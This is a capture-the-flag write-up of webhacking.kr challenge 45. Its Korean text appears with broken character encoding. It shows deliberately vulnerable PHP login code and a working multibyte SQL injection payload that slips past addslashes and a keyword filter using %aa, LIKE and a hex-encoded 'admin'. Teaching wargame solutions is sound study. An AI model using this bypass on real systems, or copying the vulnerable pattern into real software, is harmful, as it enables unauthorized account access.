---
title: "[webhacking.kr] 45ë²ˆ ë¬¸ì œ í’€ì´[sql injection]]"
categories:
  - webhacking
tags:
  - webhacking.kr
  - wargame
  - sql injection
toc: true
toc_sticky: true
toc_label: "45ë²ˆ ë¬¸ì œ í’€ì´"
toc_icon: "bookmark"
author_profile: true
---

ğŸ’¡ Webhacking.kr challenge(old) 45ë²ˆ ë¬¸ì œì— ëŒ€í•œ í’€ì´ì…ë‹ˆë‹¤.
{: .notice--warning}

# ë¬¸ì œ
  ![image](https://user-images.githubusercontent.com/33647663/152755575-57026a88-2193-49dd-b9b5-5ff03a78f7a5.png)


  ```php
<?php
  if($_GET['id'] && $_GET['pw']){
    $db = dbconnect();
    $_GET['id'] = addslashes($_GET['id']);
    $_GET['pw'] = addslashes($_GET['pw']);
    $_GET['id'] = mb_convert_encoding($_GET['id'],'utf-8','euc-kr');
    if(preg_match("/admin|select|limit|pw|=|<|>/i",$_GET['id'])) exit();
    if(preg_match("/admin|select|limit|pw|=|<|>/i",$_GET['pw'])) exit();
    $result = mysqli_fetch_array(mysqli_query($db,"select id from chall45 where id='{$_GET['id']}' and pw=md5('{$_GET['pw']}')"));
    if($result){
      echo "hi {$result['id']}";
      if($result['id'] == "admin") solve(45);
    }
    else echo("Wrong");
  }
?>
  ```


# ë¬¸ì œ í’€ì´
  ë‹¤ìŒì˜ sql ë¬¸ì„ ì¸ì ì…˜ í•˜ì—¬ adminì´ ë‚˜ì˜¤ë„ë¡ í•˜ë©´ ë©ë‹ˆë‹¤.

  ```sql
select id from chall45 where id='{}' and pw=md5('%aa') or id like 0x61646d696e-- ')
  ```

  ì´ë²ˆ ë¬¸ì œëŠ” addslashes() í•¨ìˆ˜ì™€ mb_convert_encoding í•¨ìˆ˜ê°€ ê°™ì´ ì“°ì´ë©´ì„œ multibyte encodingì„ í†µí•´ì„œ addslashesí•¨ìˆ˜ë¥¼ ìš°íšŒí•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.

  mb_convert_encodingì´ 'id'ì— ì“°ì˜€ê¸° ë•Œë¬¸ì— ê³µê²©ì§€ì ì€ idë¡œ í•˜ê³ , ë‹¤ìŒê³¼ ê°™ì´ injectionì„ ì‹œí‚¬ í˜ì´ë¡œë“œ ì´ˆì•ˆì„ ì‘ì„±í•©ë‹ˆë‹¤.

  ```sql
  id = %aa' or id='admin'#
  ```

  ì´ì œ ìœ„ì˜ ì´ˆì•ˆì—ì„œ í•„í„°ë§ ë˜ëŠ” ë¬¸ìì—´ë“¤ì„ ê³ ë ¤í•˜ì—¬ ìš°íšŒí•˜ì—¬ ì¤ë‹ˆë‹¤.

  - ```=``` : like ì‚¬ìš©ìœ¼ë¡œ ìš°íšŒ
  - ```admin``` : 0x61646d696e ë¡œ ìš°íšŒ
  
  ë”°ë¼ì„œ ë‹¤ìŒê³¼ ê°™ì´ ë³€í˜•ì‹œì¼œì„œ injectionì„ ì‹œë„í•©ë‹ˆë‹¤.

  ```sql
  %aa' or id like 0x61646d696e#
  ```

  ìœ„ì˜ ê°’ì„ ì¸ì½”ë”©í•˜ì—¬ ì…ë ¥í•˜ë©´ ë‹¤ìŒê³¼ ê°™ì´ ë¬¸ì œê°€ í’€ë¦½ë‹ˆë‹¤.

  ![image](https://user-images.githubusercontent.com/33647663/152758302-7d3bd5f8-0408-4dfd-8794-a91be9d3321c.png)


 